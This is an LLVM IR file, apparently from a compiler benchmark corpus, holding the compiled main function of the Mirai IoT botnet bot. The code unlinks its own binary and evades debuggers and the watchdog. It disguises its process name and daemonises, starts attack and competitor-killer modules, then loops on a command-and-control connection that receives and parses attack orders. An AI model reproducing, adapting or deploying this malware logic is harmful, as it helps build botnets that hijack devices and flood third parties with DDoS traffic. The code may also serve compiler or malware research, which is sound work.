; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_main.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_main.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, %struct.TYPE_3__, i32 }
%struct.TYPE_3__ = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.sockaddr_in = type { i32 }
%struct.sockaddr = type { i32 }

@SIGINT = common dso_local global i32 0, align 4
@SIG_BLOCK = common dso_local global i32 0, align 4
@SIGCHLD = common dso_local global i32 0, align 4
@SIGTRAP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [14 x i8] c"/dev/watchdog\00", align 1
@.str.1 = private unnamed_addr constant [19 x i8] c"/dev/misc/watchdog\00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@LOCAL_ADDR = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@srv_addr = common dso_local global %struct.TYPE_4__ zeroinitializer, align 4
@FAKE_CNC_ADDR = common dso_local global i32 0, align 4
@FAKE_CNC_PORT = common dso_local global i32 0, align 4
@PR_SET_NAME = common dso_local global i32 0, align 4
@TABLE_EXEC_SUCCESS = common dso_local global i32 0, align 4
@STDOUT = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@STDIN = common dso_local global i32 0, align 4
@STDERR = common dso_local global i32 0, align 4
@TRUE = common dso_local global i64 0, align 8
@fd_ctrl = common dso_local global i32 0, align 4
@fd_serv = common dso_local global i32 0, align 4
@pending_connection = common dso_local global i64 0, align 8
@MSG_NOSIGNAL = common dso_local global i32 0, align 4
@FALSE = common dso_local global i64 0, align 8
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_ERROR = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@errno = common dso_local global i32 0, align 4
@MSG_PEEK = common dso_local global i32 0, align 4
@EWOULDBLOCK = common dso_local global i32 0, align 4
@EAGAIN = common dso_local global i32 0, align 4
@EINTR = common dso_local global i32 0, align 4
@SA_SIGINFO = common dso_local global i8* null, align 8
@SIGBUS = common dso_local global i32 0, align 4
@SIGSEGV = common dso_local global i32 0, align 4
@segv_handler = common dso_local global i8* null, align 8

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [32 x i8], align 16
  %8 = alloca [32 x i8], align 16
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca %struct.timeval, align 8
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca %struct.sockaddr_in, align 4
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  %27 = alloca i8, align 1
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  %33 = load i8*, i8** %32, align 8
  %34 = call i32 @unlink(i8* %33)
  %35 = call i32 @sigemptyset(i32* %13)
  %36 = load i32, i32* @SIGINT, align 4
  %37 = call i32 @sigaddset(i32* %13, i32 %36)
  %38 = load i32, i32* @SIG_BLOCK, align 4
  %39 = call i32 @sigprocmask(i32 %38, i32* %13, i32* null)
  %40 = load i32, i32* @SIGCHLD, align 4
  %41 = call i32 @signal(i32 %40, i32 (i32)* @SIG_IGN)
  %42 = load i32, i32* @SIGTRAP, align 4
  %43 = call i32 @signal(i32 %42, i32 (i32)* @anti_gdb_entry)
  %44 = call i32 @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i32 2)
  store i32 %44, i32* %14, align 4
  %45 = icmp ne i32 %44, -1
  br i1 %45, label %49, label %46

46:                                               ; preds = %2
  %47 = call i32 @open(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i32 2)
  store i32 %47, i32* %14, align 4
  %48 = icmp ne i32 %47, -1
  br i1 %48, label %49, label %54

49:                                               ; preds = %46, %2
  store i32 1, i32* %15, align 4
  %50 = load i32, i32* %14, align 4
  %51 = call i32 @ioctl(i32 %50, i32 -2147199228, i32* %15)
  %52 = load i32, i32* %14, align 4
  %53 = call i32 @close(i32 %52)
  store i32 0, i32* %14, align 4
  br label %54

54:                                               ; preds = %49, %46
  %55 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %56 = call i32 (...) @util_local_addr()
  store i32 %56, i32* @LOCAL_ADDR, align 4
  %57 = load i32, i32* @AF_INET, align 4
  store i32 %57, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @srv_addr, i32 0, i32 2), align 4
  %58 = load i32, i32* @FAKE_CNC_ADDR, align 4
  store i32 %58, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @srv_addr, i32 0, i32 1, i32 0), align 4
  %59 = load i32, i32* @FAKE_CNC_PORT, align 4
  %60 = call i32 @htons(i32 %59)
  store i32 %60, i32* getelementptr inbounds (%struct.TYPE_4__, %struct.TYPE_4__* @srv_addr, i32 0, i32 0), align 4
  %61 = load i8**, i8*** %5, align 8
  %62 = getelementptr inbounds i8*, i8** %61, i64 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i64 @unlock_tbl_if_nodebug(i8* %63)
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %69

66:                                               ; preds = %54
  %67 = load i32, i32* @SIGTRAP, align 4
  %68 = call i32 @raise(i32 %67)
  br label %69

69:                                               ; preds = %66, %54
  %70 = call i32 (...) @ensure_single_instance()
  %71 = call i32 (...) @rand_init()
  %72 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %73 = call i32 @util_zero(i8* %72, i32 32)
  %74 = load i32, i32* %4, align 4
  %75 = icmp eq i32 %74, 2
  br i1 %75, label %76, label %96

76:                                               ; preds = %69
  %77 = load i8**, i8*** %5, align 8
  %78 = getelementptr inbounds i8*, i8** %77, i64 1
  %79 = load i8*, i8** %78, align 8
  %80 = call i32 @util_strlen(i8* %79)
  %81 = icmp slt i32 %80, 32
  br i1 %81, label %82, label %96

82:                                               ; preds = %76
  %83 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %84 = load i8**, i8*** %5, align 8
  %85 = getelementptr inbounds i8*, i8** %84, i64 1
  %86 = load i8*, i8** %85, align 8
  %87 = call i32 @util_strcpy(i8* %83, i8* %86)
  %88 = load i8**, i8*** %5, align 8
  %89 = getelementptr inbounds i8*, i8** %88, i64 1
  %90 = load i8*, i8** %89, align 8
  %91 = load i8**, i8*** %5, align 8
  %92 = getelementptr inbounds i8*, i8** %91, i64 1
  %93 = load i8*, i8** %92, align 8
  %94 = call i32 @util_strlen(i8* %93)
  %95 = call i32 @util_zero(i8* %90, i32 %94)
  br label %96

96:                                               ; preds = %82, %76, %69
  %97 = call i32 (...) @rand_next()
  %98 = srem i32 %97, 4
  %99 = add nsw i32 %98, 3
  %100 = mul nsw i32 %99, 4
  store i32 %100, i32* %9, align 4
  %101 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %102 = load i32, i32* %9, align 4
  %103 = call i32 @rand_alphastr(i8* %101, i32 %102)
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %105
  store i8 0, i8* %106, align 1
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 0
  %109 = load i8*, i8** %108, align 8
  %110 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %111 = call i32 @util_strcpy(i8* %109, i8* %110)
  %112 = call i32 (...) @rand_next()
  %113 = srem i32 %112, 6
  %114 = add nsw i32 %113, 3
  %115 = mul nsw i32 %114, 4
  store i32 %115, i32* %9, align 4
  %116 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %117 = load i32, i32* %9, align 4
  %118 = call i32 @rand_alphastr(i8* %116, i32 %117)
  %119 = load i32, i32* %9, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %120
  store i8 0, i8* %121, align 1
  %122 = load i32, i32* @PR_SET_NAME, align 4
  %123 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 0
  %124 = call i32 @prctl(i32 %122, i8* %123)
  %125 = load i32, i32* @TABLE_EXEC_SUCCESS, align 4
  %126 = call i32 @table_unlock_val(i32 %125)
  %127 = load i32, i32* @TABLE_EXEC_SUCCESS, align 4
  %128 = call i8* @table_retrieve_val(i32 %127, i32* %10)
  store i8* %128, i8** %6, align 8
  %129 = load i32, i32* @STDOUT, align 4
  %130 = load i8*, i8** %6, align 8
  %131 = load i32, i32* %10, align 4
  %132 = call i32 @write(i32 %129, i8* %130, i32 %131)
  %133 = load i32, i32* @STDOUT, align 4
  %134 = call i32 @write(i32 %133, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i32 1)
  %135 = load i32, i32* @TABLE_EXEC_SUCCESS, align 4
  %136 = call i32 @table_lock_val(i32 %135)
  %137 = call i64 (...) @fork()
  %138 = icmp sgt i64 %137, 0
  br i1 %138, label %139, label %140

139:                                              ; preds = %96
  store i32 0, i32* %3, align 4
  br label %373

140:                                              ; preds = %96
  %141 = call i32 (...) @setsid()
  store i32 %141, i32* %11, align 4
  %142 = load i32, i32* @STDIN, align 4
  %143 = call i32 @close(i32 %142)
  %144 = load i32, i32* @STDOUT, align 4
  %145 = call i32 @close(i32 %144)
  %146 = load i32, i32* @STDERR, align 4
  %147 = call i32 @close(i32 %146)
  %148 = call i32 (...) @attack_init()
  %149 = call i32 (...) @killer_init()
  br label %150

150:                                              ; preds = %371, %350, %344, %309, %304, %298, %191, %140
  %151 = load i64, i64* @TRUE, align 8
  %152 = icmp ne i64 %151, 0
  br i1 %152, label %153, label %372

153:                                              ; preds = %150
  %154 = call i32 @FD_ZERO(i32* %16)
  %155 = call i32 @FD_ZERO(i32* %17)
  %156 = load i32, i32* @fd_ctrl, align 4
  %157 = icmp ne i32 %156, -1
  br i1 %157, label %158, label %161

158:                                              ; preds = %153
  %159 = load i32, i32* @fd_ctrl, align 4
  %160 = call i32 @FD_SET(i32 %159, i32* %16)
  br label %161

161:                                              ; preds = %158, %153
  %162 = load i32, i32* @fd_serv, align 4
  %163 = icmp eq i32 %162, -1
  br i1 %163, label %164, label %166

164:                                              ; preds = %161
  %165 = call i32 (...) @establish_connection()
  br label %166

166:                                              ; preds = %164, %161
  %167 = load i64, i64* @pending_connection, align 8
  %168 = icmp ne i64 %167, 0
  br i1 %168, label %169, label %172

169:                                              ; preds = %166
  %170 = load i32, i32* @fd_serv, align 4
  %171 = call i32 @FD_SET(i32 %170, i32* %17)
  br label %175

172:                                              ; preds = %166
  %173 = load i32, i32* @fd_serv, align 4
  %174 = call i32 @FD_SET(i32 %173, i32* %16)
  br label %175

175:                                              ; preds = %172, %169
  %176 = load i32, i32* @fd_ctrl, align 4
  %177 = load i32, i32* @fd_serv, align 4
  %178 = icmp sgt i32 %176, %177
  br i1 %178, label %179, label %181

179:                                              ; preds = %175
  %180 = load i32, i32* @fd_ctrl, align 4
  store i32 %180, i32* %20, align 4
  br label %183

181:                                              ; preds = %175
  %182 = load i32, i32* @fd_serv, align 4
  store i32 %182, i32* %20, align 4
  br label %183

183:                                              ; preds = %181, %179
  %184 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 1
  store i64 0, i64* %184, align 8
  %185 = getelementptr inbounds %struct.timeval, %struct.timeval* %19, i32 0, i32 0
  store i32 10, i32* %185, align 8
  %186 = load i32, i32* %20, align 4
  %187 = add nsw i32 %186, 1
  %188 = call i32 @select(i32 %187, i32* %16, i32* %17, i32* null, %struct.timeval* %19)
  store i32 %188, i32* %21, align 4
  %189 = load i32, i32* %21, align 4
  %190 = icmp eq i32 %189, -1
  br i1 %190, label %191, label %192

191:                                              ; preds = %183
  br label %150

192:                                              ; preds = %183
  %193 = load i32, i32* %21, align 4
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %205

195:                                              ; preds = %192
  store i32 0, i32* %22, align 4
  %196 = load i32, i32* %12, align 4
  %197 = add nsw i32 %196, 1
  store i32 %197, i32* %12, align 4
  %198 = srem i32 %196, 6
  %199 = icmp eq i32 %198, 0
  br i1 %199, label %200, label %204

200:                                              ; preds = %195
  %201 = load i32, i32* @fd_serv, align 4
  %202 = load i32, i32* @MSG_NOSIGNAL, align 4
  %203 = call i32 (i32, ...) @send(i32 %201, i32* %22, i64 4, i32 %202)
  br label %204

204:                                              ; preds = %200, %195
  br label %205

205:                                              ; preds = %204, %192
  br label %206

206:                                              ; preds = %205
  %207 = load i32, i32* @fd_ctrl, align 4
  %208 = icmp ne i32 %207, -1
  br i1 %208, label %209, label %223

209:                                              ; preds = %206
  %210 = load i32, i32* @fd_ctrl, align 4
  %211 = call i64 @FD_ISSET(i32 %210, i32* %16)
  %212 = icmp ne i64 %211, 0
  br i1 %212, label %213, label %223

213:                                              ; preds = %209
  store i32 4, i32* %24, align 4
  %214 = load i32, i32* @fd_ctrl, align 4
  %215 = bitcast %struct.sockaddr_in* %23 to %struct.sockaddr*
  %216 = call i32 @accept(i32 %214, %struct.sockaddr* %215, i32* %24)
  %217 = call i32 (...) @killer_kill()
  %218 = call i32 (...) @attack_kill_all()
  %219 = load i32, i32* %11, align 4
  %220 = mul nsw i32 %219, -1
  %221 = call i32 @kill(i32 %220, i32 9)
  %222 = call i32 @exit(i32 0) #3
  unreachable

223:                                              ; preds = %209, %206
  %224 = load i64, i64* @pending_connection, align 8
  %225 = icmp ne i64 %224, 0
  br i1 %225, label %226, label %271

226:                                              ; preds = %223
  %227 = load i64, i64* @FALSE, align 8
  store i64 %227, i64* @pending_connection, align 8
  %228 = load i32, i32* @fd_serv, align 4
  %229 = call i64 @FD_ISSET(i32 %228, i32* %17)
  %230 = icmp ne i64 %229, 0
  br i1 %230, label %233, label %231

231:                                              ; preds = %226
  %232 = call i32 (...) @teardown_connection()
  br label %270

233:                                              ; preds = %226
  store i32 0, i32* %25, align 4
  store i32 4, i32* %26, align 4
  %234 = load i32, i32* @fd_serv, align 4
  %235 = load i32, i32* @SOL_SOCKET, align 4
  %236 = load i32, i32* @SO_ERROR, align 4
  %237 = call i32 @getsockopt(i32 %234, i32 %235, i32 %236, i32* %25, i32* %26)
  %238 = load i32, i32* %25, align 4
  %239 = icmp ne i32 %238, 0
  br i1 %239, label %240, label %247

240:                                              ; preds = %233
  %241 = load i32, i32* @fd_serv, align 4
  %242 = call i32 @close(i32 %241)
  store i32 -1, i32* @fd_serv, align 4
  %243 = call i32 (...) @rand_next()
  %244 = srem i32 %243, 10
  %245 = add nsw i32 %244, 1
  %246 = call i32 @sleep(i32 %245)
  br label %269

247:                                              ; preds = %233
  %248 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %249 = call i32 @util_strlen(i8* %248)
  %250 = trunc i32 %249 to i8
  store i8 %250, i8* %27, align 1
  %251 = call i32 (...) @util_local_addr()
  store i32 %251, i32* @LOCAL_ADDR, align 4
  %252 = load i32, i32* @fd_serv, align 4
  %253 = load i32, i32* @MSG_NOSIGNAL, align 4
  %254 = call i32 (i32, ...) @send(i32 %252, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.4, i64 0, i64 0), i32 4, i32 %253)
  %255 = load i32, i32* @fd_serv, align 4
  %256 = load i32, i32* @MSG_NOSIGNAL, align 4
  %257 = call i32 (i32, ...) @send(i32 %255, i8* %27, i64 1, i32 %256)
  %258 = load i8, i8* %27, align 1
  %259 = sext i8 %258 to i32
  %260 = icmp sgt i32 %259, 0
  br i1 %260, label %261, label %268

261:                                              ; preds = %247
  %262 = load i32, i32* @fd_serv, align 4
  %263 = getelementptr inbounds [32 x i8], [32 x i8]* %8, i64 0, i64 0
  %264 = load i8, i8* %27, align 1
  %265 = sext i8 %264 to i32
  %266 = load i32, i32* @MSG_NOSIGNAL, align 4
  %267 = call i32 (i32, ...) @send(i32 %262, i8* %263, i32 %265, i32 %266)
  br label %268

268:                                              ; preds = %261, %247
  br label %269

269:                                              ; preds = %268, %240
  br label %270

270:                                              ; preds = %269, %231
  br label %371

271:                                              ; preds = %223
  %272 = load i32, i32* @fd_serv, align 4
  %273 = icmp ne i32 %272, -1
  br i1 %273, label %274, label %370

274:                                              ; preds = %271
  %275 = load i32, i32* @fd_serv, align 4
  %276 = call i64 @FD_ISSET(i32 %275, i32* %16)
  %277 = icmp ne i64 %276, 0
  br i1 %277, label %278, label %370

278:                                              ; preds = %274
  store i32 0, i32* @errno, align 4
  %279 = load i32, i32* @fd_serv, align 4
  %280 = load i32, i32* @MSG_NOSIGNAL, align 4
  %281 = load i32, i32* @MSG_PEEK, align 4
  %282 = or i32 %280, %281
  %283 = call i32 (i32, ...) @recv(i32 %279, i32* %29, i64 4, i32 %282)
  store i32 %283, i32* %28, align 4
  %284 = load i32, i32* %28, align 4
  %285 = icmp eq i32 %284, -1
  br i1 %285, label %286, label %301

286:                                              ; preds = %278
  %287 = load i32, i32* @errno, align 4
  %288 = load i32, i32* @EWOULDBLOCK, align 4
  %289 = icmp eq i32 %287, %288
  br i1 %289, label %298, label %290

290:                                              ; preds = %286
  %291 = load i32, i32* @errno, align 4
  %292 = load i32, i32* @EAGAIN, align 4
  %293 = icmp eq i32 %291, %292
  br i1 %293, label %298, label %294

294:                                              ; preds = %290
  %295 = load i32, i32* @errno, align 4
  %296 = load i32, i32* @EINTR, align 4
  %297 = icmp eq i32 %295, %296
  br i1 %297, label %298, label %299

298:                                              ; preds = %294, %290, %286
  br label %150

299:                                              ; preds = %294
  store i32 0, i32* %28, align 4
  br label %300

300:                                              ; preds = %299
  br label %301

301:                                              ; preds = %300, %278
  %302 = load i32, i32* %28, align 4
  %303 = icmp eq i32 %302, 0
  br i1 %303, label %304, label %306

304:                                              ; preds = %301
  %305 = call i32 (...) @teardown_connection()
  br label %150

306:                                              ; preds = %301
  %307 = load i32, i32* %29, align 4
  %308 = icmp eq i32 %307, 0
  br i1 %308, label %309, label %313

309:                                              ; preds = %306
  %310 = load i32, i32* @fd_serv, align 4
  %311 = load i32, i32* @MSG_NOSIGNAL, align 4
  %312 = call i32 (i32, ...) @recv(i32 %310, i32* %29, i64 4, i32 %311)
  br label %150

313:                                              ; preds = %306
  %314 = load i32, i32* %29, align 4
  %315 = call i32 @ntohs(i32 %314)
  store i32 %315, i32* %29, align 4
  %316 = load i32, i32* %29, align 4
  %317 = sext i32 %316 to i64
  %318 = icmp ugt i64 %317, 1024
  br i1 %318, label %319, label %322

319:                                              ; preds = %313
  %320 = load i32, i32* @fd_serv, align 4
  %321 = call i32 @close(i32 %320)
  store i32 -1, i32* @fd_serv, align 4
  br label %322

322:                                              ; preds = %319, %313
  store i32 0, i32* @errno, align 4
  %323 = load i32, i32* @fd_serv, align 4
  %324 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %325 = load i32, i32* %29, align 4
  %326 = load i32, i32* @MSG_NOSIGNAL, align 4
  %327 = load i32, i32* @MSG_PEEK, align 4
  %328 = or i32 %326, %327
  %329 = call i32 (i32, ...) @recv(i32 %323, i8* %324, i32 %325, i32 %328)
  store i32 %329, i32* %28, align 4
  %330 = load i32, i32* %28, align 4
  %331 = icmp eq i32 %330, -1
  br i1 %331, label %332, label %347

332:                                              ; preds = %322
  %333 = load i32, i32* @errno, align 4
  %334 = load i32, i32* @EWOULDBLOCK, align 4
  %335 = icmp eq i32 %333, %334
  br i1 %335, label %344, label %336

336:                                              ; preds = %332
  %337 = load i32, i32* @errno, align 4
  %338 = load i32, i32* @EAGAIN, align 4
  %339 = icmp eq i32 %337, %338
  br i1 %339, label %344, label %340

340:                                              ; preds = %336
  %341 = load i32, i32* @errno, align 4
  %342 = load i32, i32* @EINTR, align 4
  %343 = icmp eq i32 %341, %342
  br i1 %343, label %344, label %345

344:                                              ; preds = %340, %336, %332
  br label %150

345:                                              ; preds = %340
  store i32 0, i32* %28, align 4
  br label %346

346:                                              ; preds = %345
  br label %347

347:                                              ; preds = %346, %322
  %348 = load i32, i32* %28, align 4
  %349 = icmp eq i32 %348, 0
  br i1 %349, label %350, label %352

350:                                              ; preds = %347
  %351 = call i32 (...) @teardown_connection()
  br label %150

352:                                              ; preds = %347
  %353 = load i32, i32* @fd_serv, align 4
  %354 = load i32, i32* @MSG_NOSIGNAL, align 4
  %355 = call i32 (i32, ...) @recv(i32 %353, i32* %29, i64 4, i32 %354)
  %356 = load i32, i32* %29, align 4
  %357 = call i32 @ntohs(i32 %356)
  store i32 %357, i32* %29, align 4
  %358 = load i32, i32* @fd_serv, align 4
  %359 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %360 = load i32, i32* %29, align 4
  %361 = load i32, i32* @MSG_NOSIGNAL, align 4
  %362 = call i32 (i32, ...) @recv(i32 %358, i8* %359, i32 %360, i32 %361)
  %363 = load i32, i32* %29, align 4
  %364 = icmp sgt i32 %363, 0
  br i1 %364, label %365, label %369

365:                                              ; preds = %352
  %366 = getelementptr inbounds [1024 x i8], [1024 x i8]* %30, i64 0, i64 0
  %367 = load i32, i32* %29, align 4
  %368 = call i32 @attack_parse(i8* %366, i32 %367)
  br label %369

369:                                              ; preds = %365, %352
  br label %370

370:                                              ; preds = %369, %274, %271
  br label %371

371:                                              ; preds = %370, %270
  br label %150

372:                                              ; preds = %150
  store i32 0, i32* %3, align 4
  br label %373

373:                                              ; preds = %372, %139
  %374 = load i32, i32* %3, align 4
  ret i32 %374
}

declare dso_local i32 @unlink(i8*) #1

declare dso_local i32 @sigemptyset(i32*) #1

declare dso_local i32 @sigaddset(i32*, i32) #1

declare dso_local i32 @sigprocmask(i32, i32*, i32*) #1

declare dso_local i32 @signal(i32, i32 (i32)*) #1

declare dso_local i32 @SIG_IGN(i32) #1

declare dso_local i32 @anti_gdb_entry(i32) #1

declare dso_local i32 @open(i8*, i32) #1

declare dso_local i32 @ioctl(i32, i32, i32*) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @chdir(i8*) #1

declare dso_local i32 @util_local_addr(...) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i64 @unlock_tbl_if_nodebug(i8*) #1

declare dso_local i32 @raise(i32) #1

declare dso_local i32 @ensure_single_instance(...) #1

declare dso_local i32 @rand_init(...) #1

declare dso_local i32 @util_zero(i8*, i32) #1

declare dso_local i32 @util_strlen(i8*) #1

declare dso_local i32 @util_strcpy(i8*, i8*) #1

declare dso_local i32 @rand_next(...) #1

declare dso_local i32 @rand_alphastr(i8*, i32) #1

declare dso_local i32 @prctl(i32, i8*) #1

declare dso_local i32 @table_unlock_val(i32) #1

declare dso_local i8* @table_retrieve_val(i32, i32*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @table_lock_val(i32) #1

declare dso_local i64 @fork(...) #1

declare dso_local i32 @setsid(...) #1

declare dso_local i32 @attack_init(...) #1

declare dso_local i32 @killer_init(...) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @establish_connection(...) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i32 @send(i32, ...) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @killer_kill(...) #1

declare dso_local i32 @attack_kill_all(...) #1

declare dso_local i32 @kill(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @teardown_connection(...) #1

declare dso_local i32 @getsockopt(i32, i32, i32, i32*, i32*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @recv(i32, ...) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @attack_parse(i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
